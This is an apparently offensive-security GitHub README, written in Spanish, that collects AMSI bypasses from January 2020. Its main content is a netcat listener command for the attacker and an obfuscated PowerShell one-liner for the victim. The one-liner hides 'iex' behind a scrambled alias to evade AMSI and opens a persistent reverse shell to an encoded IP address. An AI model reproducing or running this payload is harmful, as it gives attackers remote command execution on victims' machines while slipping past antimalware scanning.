![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

```
 _   _   ___  _____  _   __          ___  ______________ _____ 
| | | | / _ \/  __ \| | / /   ___    |  \/  |  _  | ___ \  ___|
| |_| |/ /_\ \ /  \/| |/ /   ( _ )   | .  . | | | | |_/ / |__  
|  _  ||  _  | |    |    \   / _ \/\ | |\/| | | | |    /|  __| 
| | | || | | | \__/\| |\  \ | (_>  < | |  | \ \_/ / |\ \| |___ 
\_| |_/\_| |_/\____/\_| \_/  \___/\/ \_|  |_/\___/\_| \_\____/ 
                                                               

```

# AMSI Bypass (Enero 2020)

> Oscar Atienza | Aka x25s Aka oski02

----------------------------------------------

Este repositorio recopila los AMSI BYPASS de 2020 

----------------------------------------------



## AMSI Bypass Enero 2020 (Powershell Reverse Shell)

Trabajo de: https://0xdarkvortex.dev/index.php/2019/07/17/red-team-ttps-part-1-amsi-evasion/



Atacante:

```
printf “%x,%x,%x,%x\n" 192 168 233 130
nc -lnvp 80
```

Victima:

```
while ($true) {$px = "c0","a8","e9","82";$p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.';$w = "GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n";$s = [System.Text.ASCIIEncoding];[byte[]]$b = 0..65535|%{0};$x = "n-eiorvsxpk5";Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);$y = New-Object System.Net.Sockets.TCPClient($p,80);$z = $y.GetStream();$d = $s::UTF8.GetBytes($w);$z.Write($d, 0, $d.Length);$t = (n-eiorvsxpk5 whoami) + "$ ";while(($l = $z.Read($b, 0, $b.Length)) -ne 0){;$v = (New-Object -TypeName $s).GetString($b,0, $l);$d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t);$z.Write($d, 0, $d.Length);}$y.Close();Start-Sleep -Seconds 5}
```
